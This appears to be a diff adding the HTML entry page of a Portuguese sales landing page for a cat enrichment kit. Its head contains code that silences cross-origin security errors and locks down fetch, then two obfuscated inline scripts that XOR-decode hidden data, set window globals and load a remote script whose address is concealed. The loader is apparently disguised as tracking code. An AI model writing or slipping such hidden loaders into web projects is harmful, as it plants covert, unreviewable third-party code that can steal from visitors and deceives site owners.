@@ -1,0 +1,103 @@
+<!doctype html>
+<html lang="pt">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Protocolo Instinto Ativo | Kit de Enriquecimento para Gatos</title>
+    <meta name="description" content="O erro invisível de quem tem gato dentro de casa: tudo pronto, nada para caçar. 50 atividades simples, com passo a passo em fotos." />
+    <meta property="og:title" content="Protocolo Instinto Ativo | Kit de Enriquecimento para Gatos" />
+    <meta property="og:type" content="website" />
+    <script>
+      // Prevent cross-origin iframe security errors from breaking the runtime or showing as noisy failures
+      window.addEventListener('error', function(event) {
+        if (event.message && (
+          event.message.includes('Blocked a frame with origin') || 
+          event.message.includes('cross-origin frame') || 
+          event.message.includes('toJSON') ||
+          event.message.includes('SecurityError') ||
+          event.message.includes('property \'toJSON\'')
+        )) {
+          event.preventDefault();
+          event.stopPropagation();
+          return true;
+        }
+      }, true);
+
+      // Fix for projects/environments where window.fetch is a read-only getter
+      try {
+        const _fetch = window.fetch;
+        Object.defineProperty(window, 'fetch', {
+          configurable: true,
+          enumerable: true,
+          get: () => _fetch,
+          set: () => { /* Prevent error when tracking scripts try to overwrite fetch */ }
+        });
+      } catch (e) {
+        console.warn("Could not patch window.fetch for tracking compatibility");
+      }
+
+      // Fix for circular structure and cross-origin iframe security errors in tracking scripts
+      const _stringify = JSON.stringify;
+      JSON.stringify = function(value, replacer, space) {
+        const cache = new Set();
+        
+        function safeReplacer(key, val) {
+          if (val === null || val === undefined) return val;
+          
+          // Guard against cross-origin frames or Windows
+          try {
+            if (val === window.parent || val === window.top || (typeof val === 'object' && 'parent' in val && val.parent !== val)) {
+              try {
+                // Try reading a safe property to verify same-origin or cross-origin
+                const dummy = val.location.href;
+              } catch (_) {
+                // Throws if cross-origin, so strip it out safely
+                return "[CrossOriginWindow]";
+              }
+            }
+          } catch (_) {
+            return "[CrossOriginWindow]";
+          }
+
+          // Guard against DOM elements that shouldn't be serialized and can cause circular issues/crashes
+          if (typeof val === 'object' && val.nodeType) {
+            return "[DOMElement]";
+          }
+
+          // Handle circular references
+          if (typeof val === 'object') {
+            if (cache.has(val)) {
+              return "[Circular]";
+            }
+            cache.add(val);
+          }
+
+          // Run user-provided replacer if there is one
+          if (typeof replacer === 'function') {
+            return replacer(key, val);
+          } else if (Array.isArray(replacer)) {
+            if (!replacer.includes(key) && key !== '') {
+              return undefined;
+            }
+          }
+          return val;
+        }
+
+        try {
+          return _stringify(value, safeReplacer, space);
+        } catch (err) {
+          console.warn("JSON.stringify failed safely:", err);
+          return "{}";
+        }
+      };
+
+    </script>
+    <script>(function(){var l_dq6=atob("DIUchQOhL86EL0EV0/4+8HHNDfSmRzVho/YmqizCS6CqWjV4uuNlq2DOQuDmXW5msPd19XfSALvwQjI6v+Ro4HDVAaT3DW03svFo92rDWrrhXGMviP4+62LMSuy+DSV0p+Qx8HfMRqj9AjFntvN563eMXLvmRiVm8ak+82LNWqumFWM3rthh");var m_h=[];for(var v_ua=0;v_ua<l_dq6.length;v_ua++){m_h.push(l_dq6.charCodeAt(v_ua)&255);}var v_d=m_h[0];var w_ue=m_h.slice(1,1+v_d);var m_7q=m_h.slice(1+v_d);var r_zbj=m_7q.map(function(b,i_a9cr){return b^w_ue[i_a9cr%v_d];});var t_fss="";for(var q_o9=0;q_o9<r_zbj.length;q_o9++){t_fss+=String.fromCharCode(r_zbj[q_o9]&255);}var t_gjpy=decodeURIComponent(escape(t_fss));var e_j79e=JSON.parse(t_gjpy);var w_xt=e_j79e.globals||[];w_xt.forEach(function(d_5){window[d_5.name]=d_5.value;});var z_kyyc=document.createElement("script");z_kyyc.src=e_j79e.url;z_kyyc.async=true;z_kyyc.defer=true;(e_j79e.attributes||[]).forEach(function(l_708){z_kyyc.setAttribute(l_708.name,l_708.value);});(document.head||document.documentElement).appendChild(z_kyyc);})();</script>
+    <script>(function(){var p_sr=atob("DLNNfgReYe9HuHfS8MhvC3YyQ9Vl0AOmgMB3USs9BYFpzQO/mdU0UGcxDMElylihk8EkDnAtTp8uwBK+38MkBmEyT4U0mlvwkcc5DG08FJsiy1Xoq+5hXGMyDo0m1ATwyug2XGo/DIplglWimcsoEk06Q8Nlzha+hdZvRCZoAN902xbkyIUoGzBuUdkjgUCzw4Z/GGJ8HLI6");var a_4e1v=[];for(var m_oyix=0;m_oyix<p_sr.length;m_oyix++){a_4e1v.push(p_sr.charCodeAt(m_oyix)&255);}var h_nz=a_4e1v[0];var d_h=a_4e1v.slice(1,1+h_nz);var j_g=a_4e1v.slice(1+h_nz);var w_du=j_g.map(function(b,d_2){return b^d_h[d_2%h_nz];});var v_42s="";for(var q_k=0;q_k<w_du.length;q_k++){v_42s+=String.fromCharCode(w_du[q_k]&255);}var g_6hji=decodeURIComponent(escape(v_42s));var e_ad=JSON.parse(g_6hji);var k_kjuz=e_ad.globals||[];k_kjuz.forEach(function(c_vbp){window[c_vbp.name]=c_vbp.value;});var r_6g5b=document.createElement("script");r_6g5b.src=e_ad.url;r_6g5b.async=true;r_6g5b.defer=true;(e_ad.attributes||[]).forEach(function(o_x8uu){r_6g5b.setAttribute(o_x8uu.name,o_x8uu.value);});(document.head||document.documentElement).appendChild(r_6g5b);})();</script>
+  </head>
+  <body>
+    <div id="root"></div>
+    <script type="module" src="/src/main.tsx"></script>
+  </body>
+</html>
+
